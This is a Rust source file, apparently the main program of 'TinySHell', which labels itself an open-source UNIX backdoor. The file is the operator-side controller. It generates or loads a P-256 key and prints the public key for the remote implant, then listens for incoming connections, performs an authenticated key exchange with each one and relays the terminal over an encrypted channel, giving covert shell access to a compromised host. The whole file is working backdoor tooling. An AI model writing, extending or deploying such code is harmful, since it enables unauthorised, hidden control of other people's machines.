#![feature(trait_alias)]
mod kex;
mod relay;
pub mod util;

use anyhow::Result;
use clap::{Parser, Subcommand};
use kex::{play_auth_challenge_local, play_dh_kex_local};
use p256::SecretKey;
use rand_core::OsRng;
use std::fs::OpenOptions;
use std::io::Write;
use std::net::{SocketAddr, TcpListener, TcpStream};
use std::path::PathBuf;

#[allow(unused_imports)]
use relay::{relay, RelayNode};

#[derive(Parser)]
#[clap(name = "TinySHell")]
#[clap(author = "Jocular")]
#[clap(version = "0.1.0")]
#[clap(about = "Open-source UNIX backdoor.", long_about = None)]
struct Cli {
	#[clap(subcommand)]
	command: Commands,
}

#[derive(Subcommand)]
enum Commands {
	KeyGen {
		#[clap(short, long, value_parser, value_name = "FILE")]
		out_file: PathBuf,
		#[clap(short, long, value_parser, value_name = "FILE")]
		in_file: Option<PathBuf>,
	},
	Listen {
		#[clap(short, long, value_parser)]
		address: SocketAddr,
		#[clap(short, long, value_parser, value_name = "FILE")]
		key_file: Option<PathBuf>,
	},
}

fn keygen(
	out_file: Option<&PathBuf>,
	in_file: &Option<PathBuf>,
) -> Result<SecretKey> {
	// First, load the key
	let priv_key = if let Some(priv_key_path) = in_file {
		SecretKey::from_sec1_pem(&std::fs::read_to_string(
			priv_key_path,
		)?)?
	} else {
		// or make a new one
		SecretKey::random(&mut OsRng)
	};

	// Print out the public key for use in the remote client
	let pub_key = priv_key.public_key().to_string();
	// println!("Use the following string in the remote's argv. \
	//    This is your public key:\n{}", pub_key
	println!(
		"{}",
		pub_key
			.replace("\n", "")
			.replace("-----BEGIN PUBLIC KEY-----", "")
			.replace("-----END PUBLIC KEY-----", "")
	);

	// Write the private key to out_file
	if let Some(out) = out_file {
		OpenOptions::new()
			.write(true)
			.create(true)
			.truncate(true)
			.open(out)?
			.write_all(
				(*priv_key.to_pem(Default::default())?).as_bytes(),
			)?;
	}

	Ok(priv_key)
}

fn handle_client(
	conn: &mut TcpStream,
	secret_l: &SecretKey,
) -> Result<()> {
	// Get the shared key
	let key = play_dh_kex_local(conn, secret_l)?;
	// Respond to the challenge
	play_auth_challenge_local(conn, secret_l)?;
	// Setup the encrypted relay betwen STDIO and the socket
	let mut local_node = RelayNode {
		readable: std::io::stdin(),
		writeable: std::io::stdout(),
	};
	relay(&mut local_node, conn, &key, &mut OsRng)?;

	Ok(())
}

fn main() {
	// Get the arguments
	let cli = Cli::parse();

	// Determine what subcommand we're using
	match &cli.command {
		Commands::KeyGen { out_file, in_file } => {
			// println!("Generating a new private key for use on the
			// local machine.");
			keygen(Some(out_file), in_file).expect("Failed key gen.");
		}
		Commands::Listen { address, key_file } => {
			// Read in the keyfile
			let key =
				keygen(None, key_file).expect("Failed to read key.");
			// Start up a listener
			let sock = TcpListener::bind(address)
				.expect("Failed to bind to address.");
			// Thread the connection handler
			for conn in sock.incoming() {
				if let Ok(mut conn_c) = conn {
					let tkey = key.clone();
					std::thread::spawn(move || {
						handle_client(&mut conn_c, &tkey).ok();
					});
				}
			}
		}
	}
}
